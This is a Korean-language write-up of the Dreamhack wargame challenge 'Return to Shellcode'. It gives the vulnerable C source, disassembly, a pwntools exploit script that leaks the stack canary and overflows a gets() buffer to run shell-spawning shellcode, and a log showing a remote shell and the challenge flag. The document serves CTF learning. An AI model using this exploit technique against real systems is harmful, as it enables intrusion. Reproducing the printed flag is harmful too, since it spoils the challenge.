## Return to Shellcode

### 보호 기법

```bash
[*] '/home/ion/wargame/dreamhack/pwnable/Return_to_Shellcode/r2s'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

`64bit` 바이너리
`Full RELRO`와 `Canary`, `PIE` 보호 기법이 걸려있습니다.
`NX` 보호 기법이 꺼져있어서 쉘 코드를 이용한 공격이 가능합니다.

<br>
<br>


### 문제 코드

```c
// Name: r2s.c
// Compile: gcc -o r2s r2s.c -zexecstack

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}
```

* `buf`의 주소를 출력해주고 있습니다.
* `Leak the Canary` 부분에서 카나리를 릭할 수 있습니다.
* 취약한 `gets` 함수로 인해 버퍼 오버플로우가 발생합니다.


<br>
<br>


### 디버깅

```bash
0x0000555555400956 <+137>:   lea    rax,[rbp-0x60]            # rax = buf
0x000055555540095a <+141>:   mov    edx,0x100                 # edx = 0x100
0x000055555540095f <+146>:   mov    rsi,rax                   # rsi = buf
0x0000555555400962 <+149>:   mov    edi,0x0                   # edi = 0
0x0000555555400967 <+154>:   call   0x555555400730 <read@plt> # read(0, buf, 0x100)
0x000055555540096c <+159>:   lea    rax,[rbp-0x60]

0x00005555554009b0 <+227>:   lea    rax,[rbp-0x60]            # rax = buf
0x00005555554009b4 <+231>:   mov    rdi,rax                   # rdi = buf
0x00005555554009b7 <+234>:   mov    eax,0x0
0x00005555554009bc <+239>:   call   0x555555400740 <gets@plt> # gets(buf)
```

첫 번째 `read` 함수로 `Canary`를 `Leak` 하고 두 번째 `gets` 함수로 버퍼 오버플로우 공격을 하면 됩니다.

![stack](https://velog.velcdn.com/images/silvergun8291/post/8b7a917b-52e3-4abe-bb42-6b6e604ef947/image.png)


<br>
<br>


### 페이로드

```bash
# Canary Leak
'A' * 89

# Buffer Overflow
shellcode + 'A' * (88 - len(shellcode)) + canary + "A" * 8 + buf_addr
```


<br>
<br>


### 익스플로잇 코드

```python
from pwn import *

def slog(name, addr):
  return success(": ".join([name, hex(addr)]))


#context.log_level = 'debug'
context.arch = "amd64"

p = remote("host3.dreamhack.games", 22998)
e = ELF("./r2s")

shellcode = asm(shellcraft.sh())


# Get buf address
p.recvuntil("Address of the buf: ")
buf = int(p.recv(14), 16)


# Canary Leak
payload = b'A' * 0x59
p.sendafter("Input: ", payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recv(7))

slog("buf", buf)
slog("canary", canary)


# BOF
payload = shellcode
payload += b'A' * (88 - len(shellcode))
payload += p64(canary)
payload += b"A" * 8
payload += p64(buf)

p.sendlineafter("Input: ", payload)

p.interactive()
```


<br>
<br>


### 익스플로잇

```bash
ion  ~/wargame/dreamhack/pwnable/Return_to_Shellcode  python3 remote.py 2> /dev/null
[+] Opening connection to host3.dreamhack.games on port 22998: Done
[*] '/home/ion/wargame/dreamhack/pwnable/Return_to_Shellcode/r2s'
   Arch:     amd64-64-little
   RELRO:    Full RELRO
   Stack:    Canary found
   NX:       NX disabled
   PIE:      PIE enabled
   RWX:      Has RWX segments
[+] buf: 0x7ffe04ea4a60
[+] canary: 0xf28d3bc5a2a37200
[*] Switching to interactive mode
$ ls
flag
r2s
$ cat flag
DH{333eb89c9d2615dd8942ece08c1d34d5}
```
